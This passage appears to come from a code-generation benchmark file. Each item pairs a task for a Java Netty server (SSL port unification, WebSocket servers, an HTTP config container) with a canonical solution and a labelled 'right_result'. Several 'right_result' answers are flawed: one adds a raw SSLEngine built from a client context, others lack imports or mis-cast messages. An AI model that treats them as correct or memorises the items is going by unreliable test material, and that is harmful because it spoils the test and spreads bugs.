    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\n\npublic class ProtocolServer {\n\n    private int port;\n    \n    private static final int MAX_FRAME_LENGTH = 1024 * 1024;\n    private static final int LENGTH_FIELD_LENGTH = 4;\n    private static final int LENGTH_FIELD_OFFSET = 6;\n    private static final int LENGTH_ADJUSTMENT = 0;\n    private static final int INITIAL_BYTES_TO_STRIP = 0;\n    \n    public ProtocolServer(int port) {\n        this.port = port;\n    }\n\n    public void run() throws Exception {\n        EventLoopGroup bossGroup = new NioEventLoopGroup();\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 public void initChannel(SocketChannel ch) throws Exception {\n                    ch.pipeline().addLast(\"decoder\",\n                            new ProtocolDecoder(MAX_FRAME_LENGTH,\n                                    LENGTH_FIELD_OFFSET,LENGTH_FIELD_LENGTH, \n                                    LENGTH_ADJUSTMENT, INITIAL_BYTES_TO_STRIP));\n                    ch.pipeline().addLast(\"encoder\", new ProtocolEncoder());\n                    ch.pipeline().addLast(new ProtocolServerHandler());\n                 }\n             })\n             .option(ChannelOption.SO_BACKLOG, 128)\n             .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture f = b.bind(port).sync();\n            System.out.println(\"Server start listen at \" + port);\n            f.channel().closeFuture().sync();\n\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.LengthFieldBasedFrameDecoder;\nimport io.netty.handler.codec.LengthFieldPrepender;\n\npublic class ProtocolServer {\n    private final int port;\n    public static final int MAX_FRAME_LENGTH = 1024 * 1024;\n    public static final int LENGTH_FIELD_LENGTH = 4;\n    public static final int LENGTH_FIELD_OFFSET = 6;\n    public static final int LENGTH_ADJUSTMENT = 0;\n    public static final int INITIAL_BYTES_TO_STRIP = 0;\n\n    public ProtocolServer(int port) {\n        this.port = port;\n    }\n\n    public void run() throws Exception {\n        EventLoopGroup bossGroup = new NioEventLoopGroup();\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 protected void initChannel(SocketChannel ch) {\n                     ChannelPipeline pipeline = ch.pipeline();\n                     pipeline.addLast(new LengthFieldBasedFrameDecoder(\n                             MAX_FRAME_LENGTH,\n                             LENGTH_FIELD_OFFSET,\n                             LENGTH_FIELD_LENGTH,\n                             LENGTH_ADJUSTMENT,\n                             INITIAL_BYTES_TO_STRIP\n                     ));\n                     pipeline.addLast(new LengthFieldPrepender(LENGTH_FIELD_LENGTH));\n                     pipeline.addLast(new ProtocolMessageHandler());\n                 }\n             })\n             .option(ChannelOption.SO_BACKLOG, 128)\n             .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture f = b.bind(port).sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n\n    public static class ProtocolMessageHandler extends ChannelInboundHandlerAdapter {\n        @Override\n        public void channelRead(ChannelHandlerContext ctx, Object msg) {\n            // Process custom protocol message here\n            byte[] bytes = (byte[]) msg;\n            String message = new String(bytes);\n            System.out.println(\"Received message: \" + message);\n            ctx.writeAndFlush(msg);\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n            cause.printStackTrace();\n            ctx.close();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 223,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework, capable of handling both secure (SSL) and non-secure connections on the same port.\n\nClass Description: PortUnificationServer is a Netty-based TCP server that listens on a specified port and can handle both SSL and plaintext connections through port unification. It uses a boss-worker thread model for efficient connection handling.\n\nAttributes:\nPORT: int - The port number on which the server will listen for incoming connections (default: 8080)\n\nMethods:\nmain: main(String[] args) -> void - The entry point of the application that:\n1. Creates a self-signed SSL certificate for testing\n2. Sets up Netty's event loop groups\n3. Configures the server bootstrap with channel type and handlers\n4. Binds to the specified port and starts the server\n5. Handles graceful shutdown of resources\n\nThe method throws Exception to handle potential errors during server setup and operation.",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.logging.LogLevel;\nimport io.netty.handler.logging.LoggingHandler;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.SelfSignedCertificate;\n\npublic final class PortUnificationServer {\n\n    static final int PORT = Integer.parseInt(System.getProperty(\"port\", \"8080\"));\n\n    public static void main(String[] args) throws Exception {\n        SelfSignedCertificate ssc = new SelfSignedCertificate();\n        final SslContext sslCtx = SslContextBuilder.forServer(ssc.certificate(), ssc.privateKey())\n            .build();\n\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .handler(new LoggingHandler(LogLevel.INFO))\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                @Override\n                public void initChannel(SocketChannel ch) throws Exception {\n                    ch.pipeline().addLast(new PortUnificationServerHandler(sslCtx));\n                }\n            });\n\n            b.bind(PORT).sync().channel().closeFuture().sync();\n        } finally {\n            bossGroup.shutdownGracefully();\n            workerGroup.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.buffer.ByteBuf;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.ByteToMessageDecoder;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.SelfSignedCertificate;\n\nimport javax.net.ssl.SSLEngine;\nimport java.net.InetSocketAddress;\nimport java.util.List;\n\npublic class PortUnificationServer {\n    public static final int PORT = 8080;\n\n    static class ProtocolDetector extends ByteToMessageDecoder {\n        private enum State { INITIAL, SSL, PLAINTEXT }\n        private State state = State.INITIAL;\n        private boolean sslDetected = false;\n\n        @Override\n        protected void decode(ChannelHandlerContext ctx, ByteBuf in, List<Object> out) throws Exception {\n            if (state == State.INITIAL) {\n                if (in.readableBytes() >= 2) {\n                    byte[] bytes = new byte[2];\n                    in.markReaderIndex();\n                    in.readBytes(bytes);\n                    in.resetReaderIndex();\n\n                    // Check for SSL/TLS handshake (starts with 16 03)\n                    if (bytes[0] == (byte) 0x16 && bytes[1] == (byte) 0x03) {\n                        state = State.SSL;\n                        sslDetected = true;\n                    } else {\n                        state = State.PLAINTEXT;\n                        sslDetected = false;\n                    }\n\n                    // Consume the read bytes\n                    in.readerIndex(in.readerIndex() + 2);\n                }\n            }\n\n            if (sslDetected) {\n                SSLEngine engine = SslContextBuilder.forClient().build().createSSLEngine();\n                engine.setUseClientMode(false);\n                ChannelPipeline pipeline = ctx.pipeline();\n                pipeline.addBefore(ctx.name(), \"ssl\", engine);\n            } else {\n                // No action needed for plaintext, just pass through\n            }\n        }\n    }\n\n    public static void main(String[] args) throws Exception {\n        SelfSignedCertificate ssc = new SelfSignedCertificate();\n        SslContext sslCtx = SslContextBuilder.forServer(ssc.certificate(), ssc.privateKey()).build();\n\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .localAddress(new InetSocketAddress(PORT))\n             .childHandler(new ChannelInitializer<>() {\n                 @Override\n                 protected void initChannel(Channel ch) {\n                     ChannelPipeline p = ch.pipeline();\n                     p.addLast(\"detector\", new ProtocolDetector());\n                 }\n             });\n\n            ChannelFuture f = b.bind().sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            bossGroup.shutdownGracefully();\n            workerGroup.shutdownGracefully();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 224,
    "Instruction": "Task Description: Create a Java class that implements a WebSocket server using Netty framework to handle WebSocket connections and messages.\n\nClass Description: The WebSocketServer class is responsible for initializing and running a Netty-based WebSocket server. It configures the server with appropriate handlers for HTTP and WebSocket protocols, manages connection threads, and binds to a specified port.\n\nAttributes:\n- initParamDTO: InitParamDTO - Configuration parameters for the server including port number and thread counts\n\nMethods:\n- WebSocketServer(InitParamDTO initParamDTO) -> None - Constructor that initializes the server with configuration parameters\n- run() -> None - Starts the WebSocket server, configures the pipeline with necessary handlers, and binds to the specified port",
    "Canonical_solution": "import com.cf.carpark.service.core.dto.InitParamDTO;\nimport com.cf.carpark.service.websocket.handler.WebSocketFrameHandler;\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.http.HttpObjectAggregator;\nimport io.netty.handler.codec.http.HttpServerCodec;\nimport io.netty.handler.codec.http.websocketx.WebSocketServerProtocolHandler;\nimport io.netty.handler.codec.string.StringDecoder;\nimport io.netty.handler.codec.string.StringEncoder;\nimport io.netty.handler.stream.ChunkedWriteHandler;\nimport io.netty.util.CharsetUtil;\nimport lombok.extern.slf4j.Slf4j;\n\nimport java.net.InetSocketAddress;\n\n@Slf4j\npublic class WebSocketServer {\n\n    private InitParamDTO initParamDTO;\n\n    public void run() {\n        EventLoopGroup boosGroup = new NioEventLoopGroup(initParamDTO.getBoosTread());\n        EventLoopGroup workGroup = new NioEventLoopGroup(initParamDTO.getWorkTread());\n        try {\n            ServerBootstrap serverBootstrap = new ServerBootstrap();\n            InitParamDTO initParamDTO = this.initParamDTO;\n            serverBootstrap.group(boosGroup, workGroup).channel(NioServerSocketChannel.class)\n                    .childHandler(new ChannelInitializer<SocketChannel>() {\n                        @Override\n                        protected void initChannel(SocketChannel socketChannel) throws Exception {\n                            ChannelPipeline pipeline = socketChannel.pipeline();\n\n                            pipeline.addLast(new HttpServerCodec());\n                            pipeline.addLast(new ChunkedWriteHandler());\n                            pipeline.addLast(new StringDecoder(CharsetUtil.UTF_8));\n                            pipeline.addLast(new StringEncoder(CharsetUtil.UTF_8));\n                            pipeline.addLast(new HttpObjectAggregator(1024 * 1024));\n                            pipeline.addLast(new WebSocketServerProtocolHandler(\"/ws\"));\n                            pipeline.addLast(new WebSocketFrameHandler(initParamDTO));\n                        }\n                    });\n\n            ChannelFuture channelFuture = serverBootstrap.bind(new InetSocketAddress(this.initParamDTO.getPort()))\n                    .addListener(future -> {\n                        log.info(\"\u670d\u52a1\u7aef\u6210\u529f\u7ed1\u5b9a\u7aef\u53e3\u53f7={}\", this.initParamDTO.getPort());\n                    });\n        } catch (Exception e) {\n            boosGroup.shutdownGracefully();\n            workGroup.shutdownGracefully();\n            log.error(\"websocketServer\u542f\u52a8\u5931\u8d25:{}\", e);\n        }\n    }\n\n    public WebSocketServer(InitParamDTO initParamDTO) {\n        this.initParamDTO = initParamDTO;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.http.HttpObjectAggregator;\nimport io.netty.handler.codec.http.HttpServerCodec;\nimport io.netty.handler.codec.http.websocketx.TextWebSocketFrame;\nimport io.netty.handler.codec.http.websocketx.WebSocketServerProtocolHandler;\nimport io.netty.handler.logging.LogLevel;\nimport io.netty.handler.logging.LoggingHandler;\n\npublic class WebSocketServer {\n    private final InitParamDTO initParamDTO;\n\n    public WebSocketServer(InitParamDTO initParamDTO) {\n        this.initParamDTO = initParamDTO;\n    }\n\n    public void run() throws Exception {\n        EventLoopGroup bossGroup = new NioEventLoopGroup(initParamDTO.getBossThreadCount());\n        EventLoopGroup workerGroup = new NioEventLoopGroup(initParamDTO.getWorkerThreadCount());\n\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .handler(new LoggingHandler(LogLevel.INFO))\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 protected void initChannel(SocketChannel ch) {\n                     ChannelPipeline pipeline = ch.pipeline();\n                     pipeline.addLast(new HttpServerCodec());\n                     pipeline.addLast(new HttpObjectAggregator(65536));\n                     pipeline.addLast(new WebSocketServerProtocolHandler(\"/ws\"));\n                     pipeline.addLast(new SimpleChannelInboundHandler<TextWebSocketFrame>() {\n                         @Override\n                         protected void channelRead0(ChannelHandlerContext ctx, TextWebSocketFrame msg) {\n                             System.out.println(\"Received: \" + msg.text());\n                             ctx.channel().writeAndFlush(new TextWebSocketFrame(\"Echo: \" + msg.text()));\n                         }\n\n                         @Override\n                         public void handlerAdded(ChannelHandlerContext ctx) {\n                             System.out.println(\"Client connected\");\n                         }\n\n                         @Override\n                         public void handlerRemoved(ChannelHandlerContext ctx) {\n                             System.out.println(\"Client disconnected\");\n                         }\n\n                         @Override\n                         public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n                             cause.printStackTrace();\n                             ctx.close();\n                         }\n                     });\n                 }\n             });\n\n            ChannelFuture f = b.bind(initParamDTO.getPort()).sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            bossGroup.shutdownGracefully();\n            workerGroup.shutdownGracefully();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 225,
    "Instruction": "Task Description: Implement a WebSocket proxy server using Java Netty framework to handle WebSocket connections and manage client-server communication.\n\nClass Description: WebsocketProxy is a class that implements a Proxy interface and provides functionality to start a WebSocket server on a specified port. It handles WebSocket protocol upgrades, HTTP requests, and manages client connections with proper resource cleanup.\n\nAttributes:\n- None (All variables are local to methods)\n\nMethods:\n- start(int port) -> void - Starts the WebSocket server on the specified port. Initializes event loop groups, configures server bootstrap with appropriate channel and handlers, binds to the port, and manages server lifecycle including graceful shutdown. Throws InterruptedException if the thread is interrupted during server operation.\n\nInput:\n- port: int - The port number on which the WebSocket server should listen for incoming connections\n\nOutput:\n- None (Void method, but it will start a server that listens on the specified port and handles WebSocket connections)\n\nNote: The implementation should include proper error handling, resource management, and support for both NIO and Epoll transport mechanisms based on system availability. The server should handle WebSocket protocol upgrades, HTTP codecs, chunked writes, and idle connection management.",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.epoll.Epoll;\nimport io.netty.channel.epoll.EpollEventLoopGroup;\nimport io.netty.channel.epoll.EpollServerSocketChannel;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.http.HttpObjectAggregator;\nimport io.netty.handler.codec.http.HttpServerCodec;\nimport io.netty.handler.codec.http.websocketx.WebSocketServerProtocolHandler;\nimport io.netty.handler.stream.ChunkedWriteHandler;\nimport io.netty.handler.timeout.IdleStateHandler;\nimport org.nico.ratel.landlords.print.SimplePrinter;\nimport org.nico.ratel.landlords.robot.RobotDecisionMakers;\n\nimport java.net.InetSocketAddress;\nimport java.util.concurrent.TimeUnit;\n\npublic class WebsocketProxy implements Proxy {\n\n    @Override\n    public void start(int port) throws InterruptedException {\n        EventLoopGroup parentGroup = Epoll.isAvailable() ? new EpollEventLoopGroup() : new NioEventLoopGroup();\n        EventLoopGroup childGroup = Epoll.isAvailable() ? new EpollEventLoopGroup() : new NioEventLoopGroup();\n        try {\n            ServerBootstrap bootstrap = new ServerBootstrap()\n                    .group(parentGroup, childGroup)\n                    .channel(Epoll.isAvailable() ? EpollServerSocketChannel.class : NioServerSocketChannel.class)\n                    .localAddress(new InetSocketAddress(port))\n                    .childHandler(new ChannelInitializer<SocketChannel>() {\n                        @Override\n                        protected void initChannel(SocketChannel ch) throws Exception {\n                            ch.pipeline()\n                                    .addLast(new IdleStateHandler(60 * 30, 0, 0, TimeUnit.SECONDS))\n                                    .addLast(new HttpServerCodec())\n                                    .addLast(new ChunkedWriteHandler())\n                                    .addLast(new HttpObjectAggregator(8192))\n                                    .addLast(\"ws\", new WebSocketServerProtocolHandler(\"/ratel\"))\n                                    .addLast(new WebsocketTransferHandler());\n                        }\n                    });\n\n            ChannelFuture f = bootstrap.bind().sync();\n\n            SimplePrinter.serverLog(\"The websocket server was successfully started on port \" + port);\n            RobotDecisionMakers.init();\n            f.channel().closeFuture().sync();\n        } finally {\n            parentGroup.shutdownGracefully();\n            childGroup.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.http.*;\nimport io.netty.handler.codec.http.websocketx.*;\nimport io.netty.handler.logging.LogLevel;\nimport io.netty.handler.logging.LoggingHandler;\nimport io.netty.handler.timeout.IdleStateHandler;\n\npublic class WebsocketProxy implements Proxy {\n\n    @Override\n    public void start(int port) throws InterruptedException {\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .handler(new LoggingHandler(LogLevel.INFO))\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 protected void initChannel(SocketChannel ch) {\n                     ChannelPipeline pipeline = ch.pipeline();\n                     pipeline.addLast(new HttpServerCodec());\n                     pipeline.addLast(new HttpObjectAggregator(65536));\n                     pipeline.addLast(new WebSocketServerProtocolHandler(\"/websocket\"));\n                     pipeline.addLast(new IdleStateHandler(0, 0, 60));\n                     pipeline.addLast(new ChannelInboundHandlerAdapter() {\n                         @Override\n                         public void channelRead(ChannelHandlerContext ctx, Object msg) {\n                             if (msg instanceof FullHttpRequest) {\n                                 FullHttpRequest request = (FullHttpRequest) msg;\n                                 if (!request.decoderResult().isSuccess()) {\n                                     sendHttpResponse(ctx, request, new DefaultFullHttpResponse(HttpVersion.HTTP_1_1, HttpResponseStatus.BAD_REQUEST));\n                                     return;\n                                 }\n\n                                 if (\"/websocket\".equals(request.uri())) {\n                                     WebSocketServerHandshakerFactory wsFactory = new WebSocketServerHandshakerFactory(\n                                         \"ws://localhost/websocket\", null, true);\n                                     WebSocketServerHandshaker handshaker = wsFactory.newHandshaker(request);\n                                     if (handshaker == null) {\n                                         WebSocketServerHandshakerFactory.sendUnsupportedVersionResponse(ctx);\n                                     } else {\n                                         handshaker.handshake(ctx, request);\n                                     }\n                                 } else {\n                                     sendHttpResponse(ctx, request, new DefaultFullHttpResponse(HttpVersion.HTTP_1_1, HttpResponseStatus.FOUND,\n                                             Unpooled.copiedBuffer(\"Redirect: /websocket\\r\\nConnection: close\\r\\n\\r\\n\".getBytes())));\n                                 }\n                             } else if (msg instanceof WebSocketFrame) {\n                                 WebSocketFrame frame = (WebSocketFrame) msg;\n                                 if (frame instanceof TextWebSocketFrame) {\n                                     ctx.writeAndFlush(new TextWebSocketFrame(frame.content().toString(CharsetUtil.UTF_8)));\n                                 } else if (frame instanceof PongWebSocketFrame) {\n                                     ctx.writeAndFlush(new PongWebSocketFrame(Unpooled.wrappedBuffer(frame.content().array())));\n                                 } else if (frame instanceof CloseWebSocketFrame) {\n                                     ctx.close();\n                                 }\n                             }\n                         }\n\n                         private void sendHttpResponse(ChannelHandlerContext ctx, FullHttpRequest req, FullHttpResponse res) {\n                             if (res.status().code() != 200) {\n                                 ByteBuf buf = Unpooled.copiedBuffer(res.status().toString(), CharsetUtil.UTF_8);\n                                 res.content().writeBytes(buf);\n                                 buf.release();\n                                 res.headers().set(HttpHeaderNames.CONTENT_TYPE, \"text/plain\");\n                                 res.headers().set(HttpHeaderNames.CONTENT_LENGTH, res.content().readableBytes());\n                             }\n\n                             ChannelFuture f = ctx.channel().writeAndFlush(res);\n                             if (!HttpUtil.isKeepAlive(req) || res.status().code() != 200) {\n                                 f.addListener(ChannelFutureListener.CLOSE);\n                             }\n                         }\n\n                         @Override\n                         public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n                             cause.printStackTrace();\n                             ctx.close();\n                         }\n                     });\n                 }\n             })\n             .option(ChannelOption.SO_BACKLOG, 128)\n             .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture f = b.bind(port).sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 226,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework to handle HTTP requests, with configurable bind address and port, and proper resource management for startup and shutdown.\n\nClass Description: WebConfigContainer is a container class that manages the lifecycle of a Netty-based HTTP server. It initializes and configures the server components, starts the server on a specified port, and provides graceful shutdown capabilities.\n\nAttributes:\n- serverWorkerGroup: [NioEventLoopGroup] - Worker thread group for handling I/O operations\n- serverBossGroup: [NioEventLoopGroup] - Boss thread group for accepting incoming connections\n- logger: [Logger] - SLF4J logger instance for logging server events\n\nMethods:\n- WebConfigContainer() -> [void] - Constructor that initializes the boss and worker event loop groups\n- start() -> [void] - Starts the HTTP server by configuring ServerBootstrap, setting up the channel pipeline with HTTP handlers, and binding to the configured port\n- stop() -> [void] - Gracefully shuts down the server by closing the event loop groups and releasing all resources",
    "Canonical_solution": "import org.fengfei.lanproxy.common.container.Container;\nimport org.fengfei.lanproxy.server.config.ProxyConfig;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelPipeline;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.http.HttpObjectAggregator;\nimport io.netty.handler.codec.http.HttpServerCodec;\nimport io.netty.handler.stream.ChunkedWriteHandler;\n\npublic class WebConfigContainer implements Container {\n\n    private static Logger logger = LoggerFactory.getLogger(WebConfigContainer.class);\n\n    private NioEventLoopGroup serverWorkerGroup;\n    private NioEventLoopGroup serverBossGroup;\n\n    public WebConfigContainer() {\n        serverBossGroup = new NioEventLoopGroup(1);\n        serverWorkerGroup = new NioEventLoopGroup(1);\n    }\n\n    @Override\n    public void start() {\n        ServerBootstrap httpServerBootstrap = new ServerBootstrap();\n        httpServerBootstrap.group(serverBossGroup, serverWorkerGroup)\n            .channel(NioServerSocketChannel.class)\n            .childHandler(new ChannelInitializer<SocketChannel>() {\n                @Override\n                public void initChannel(SocketChannel ch) throws Exception {\n                    ChannelPipeline pipeline = ch.pipeline();\n                    pipeline.addLast(new HttpServerCodec());\n                    pipeline.addLast(new HttpObjectAggregator(8 * 1024 * 1024));\n                    pipeline.addLast(new ChunkedWriteHandler());\n                    pipeline.addLast(new HttpRequestHandler());\n                }\n            });\n\n        try {\n            httpServerBootstrap.bind(ProxyConfig.getInstance().getConfigServerBind(),\n                    ProxyConfig.getInstance().getConfigServerPort()).get();\n            logger.info(\"http server start on port \" + ProxyConfig.getInstance().getConfigServerPort());\n        } catch (Exception ex) {\n            throw new RuntimeException(ex);\n        }\n    }\n\n    @Override\n    public void stop() {\n        serverBossGroup.shutdownGracefully();\n        serverWorkerGroup.shutdownGracefully();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.http.HttpObjectAggregator;\nimport io.netty.handler.codec.http.HttpRequestDecoder;\nimport io.netty.handler.codec.http.HttpResponseEncoder;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\npublic class WebConfigContainer {\n    private final NioEventLoopGroup serverBossGroup = new NioEventLoopGroup(1);\n    private final NioEventLoopGroup serverWorkerGroup = new NioEventLoopGroup();\n    private final Logger logger = LoggerFactory.getLogger(WebConfigContainer.class);\n    private int port = 8080;\n    private String bindAddress = \"0.0.0.0\";\n    private ChannelFuture channelFuture;\n\n    public WebConfigContainer() {\n        // Constructor can be extended if needed for custom initialization\n    }\n\n    public void start() {\n        ServerBootstrap bootstrap = new ServerBootstrap();\n        bootstrap.group(serverBossGroup, serverWorkerGroup)\n                .channel(NioServerSocketChannel.class)\n                .childHandler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    protected void initChannel(SocketChannel ch) {\n                        ch.pipeline().addLast(new HttpRequestDecoder());\n                        ch.pipeline().addLast(new HttpObjectAggregator(65536));\n                        ch.pipeline().addLast(new HttpResponseEncoder());\n                        // Add your HTTP handler here\n                        // ch.pipeline().addLast(new YourHttpHandler());\n                    }\n                })\n                .option(ChannelOption.SO_BACKLOG, 128)\n                .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n        try {\n            channelFuture = bootstrap.bind(bindAddress, port).sync();\n            logger.info(\"WebConfigContainer started and listening on {}:{}\", bindAddress, port);\n            channelFuture.channel().closeFuture().sync();\n        } catch (InterruptedException e) {\n            logger.error(\"Error starting WebConfigContainer\", e);\n            Thread.currentThread().interrupt();\n        }\n    }\n\n    public void stop() {\n        if (channelFuture != null && channelFuture.channel() != null && channelFuture.channel().isOpen()) {\n            channelFuture.channel().close();\n        }\n        serverBossGroup.shutdownGracefully();\n        serverWorkerGroup.shutdownGracefully();\n        logger.info(\"WebConfigContainer stopped gracefully.\");\n    }\n\n    public void setPort(int port) {\n        this.port = port;\n    }\n\n    public void setBindAddress(String bindAddress) {\n        this.bindAddress = bindAddress;\n    }\n}\n```"
  },
  {
    "Task_id": 227,
    "Instruction": "Task Description: Implement a Netty-based HTTP server in Java that handles incoming HTTP requests with tracing capabilities for specific endpoints.\n\nClass Description: NettyHttpServer is a TCP server implementation using Netty framework that listens for HTTP requests. It provides tracing functionality for specific endpoints (\"/unsampled\" and \"/traced\") while serving regular requests for other paths. The server manages its lifecycle through start and stop methods.\n\nAttributes:\n- bossGroup: [EventLoopGroup] - Handles incoming connections (accept loop)\n- workerGroup: [EventLoopGroup] - Handles I/O operations for established connections\n\nMethods:\n- startServer() -> [int] - Starts the HTTP server on an available port, returns the bound port number\n- stopServer() -> [void] - Shuts down the server gracefully, releasing all resources\n- TracingDispatchHandler (inner class) - Handles request tracing for specific endpoints\n  - channelRead(ChannelHandlerContext, Object) -> [void] - Processes incoming messages and routes them to appropriate tracing handlers\n  - write(ChannelHandlerContext, Object, ChannelPromise) -> [void] - Processes outgoing messages with tracing context",
